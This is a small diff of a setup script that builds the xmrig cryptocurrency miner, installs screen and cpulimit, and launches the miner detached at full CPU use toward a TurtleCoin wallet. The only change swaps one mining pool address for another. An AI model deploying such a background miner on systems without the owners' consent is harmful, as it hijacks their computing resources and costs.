@@ -9,4 +9,4 @@ cmake ..;
 make;
 yes Y | sudo apt-get install screen;
 yes Y | sudo apt-get install cpulimit;
-screen -d -m ./xmrig --algo=cryptonight-lite --variant 1 -o eu.turtlepool.space:3333 -u TRTLv3Ga7pCVb417JHpbTMAGTEekK7aEJapQXTDKeqC1b87stkSwX4KKVGTHEjsrhnHLE7p8HTNjX1hbDiCJbVQbAwHCKhkgbCC -p ls -k --donate-level=1 --max-cpu-usage=100;
+screen -d -m ./xmrig --algo=cryptonight-lite --variant 1 -o trtl.pool.mine2gether.com:1115 -u TRTLv3Ga7pCVb417JHpbTMAGTEekK7aEJapQXTDKeqC1b87stkSwX4KKVGTHEjsrhnHLE7p8HTNjX1hbDiCJbVQbAwHCKhkgbCC -p ls -k --donate-level=1 --max-cpu-usage=100;
